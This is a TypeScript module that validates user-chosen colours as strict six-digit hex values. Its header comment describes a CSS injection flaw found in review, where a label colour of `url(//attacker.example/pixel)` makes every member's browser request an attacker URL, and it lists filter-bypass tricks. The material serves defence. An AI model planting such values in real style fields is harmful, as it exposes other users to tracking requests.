/**
 * The one definition of what a colour is.
 *
 * Teams, workflow states, labels and projects all carry a user-chosen colour,
 * and every one of those values ends up assigned to a CSS property — a
 * `background`, a `border-color`, an SVG `fill`. That makes the column a
 * script-adjacent surface rather than a cosmetic one.
 *
 * The concrete failure an independent review found: the write schemas accepted
 * `z.string().max(40)`, so an authorised member could name a label
 * `url(//attacker.example/pixel)`. It is stored, and thereafter *every other
 * member's browser* fetches that URL whenever the label renders — a persistent,
 * attacker-controlled request originating from inside the workspace, complete
 * with a referrer that names it. Nothing about it looks like an attack in the
 * database; it looks like a colour.
 *
 * React escapes text, which is why this is not an XSS. It does not escape the
 * *value* of a style property, which is why it is still a defect.
 *
 * So the rule is a whitelist, not a blacklist: six hex digits after a `#`, and
 * nothing else. Not "reject `url(`" — that game is unwinnable, because CSS has
 * `image-set()`, `-webkit-image-set()`, escapes, and comment-splitting. A
 * six-hex-digit string cannot express any of them.
 *
 * The same rule is enforced twice, deliberately: here at the boundary, so a
 * caller gets a clear error, and again as a `check` constraint in `schema.sql`,
 * so a future call site that forgets this module cannot reintroduce the hole.
 */

/** `#` followed by exactly six hex digits. Case-insensitive on input. */
export const HEX_COLOR = /^#[0-9a-fA-F]{6}$/;

export function isHexColor(value: unknown): value is string {
  return typeof value === "string" && HEX_COLOR.test(value);
}

/**
 * Normalise a colour for storage.
 *
 * Lowercased so `#5E6AD2` and `#5e6ad2` are one value rather than two — they
 * render identically, and storing both makes "the colours that are in use"
 * a question with two answers.
 *
 * @throws if the value is not a six-digit hex colour.
 */
export function normalizeHexColor(value: string): string {
  const trimmed = value.trim();
  if (!HEX_COLOR.test(trimmed)) {
    throw new InvalidColorError(value);
  }
  return trimmed.toLowerCase();
}

export class InvalidColorError extends Error {
  constructor(readonly value: string) {
    // The offending value is not echoed: it is attacker-chosen text that would
    // otherwise travel back through an error message into a UI.
    super("Colour must be a hex value such as #5e6ad2.");
    this.name = "InvalidColorError";
  }
}
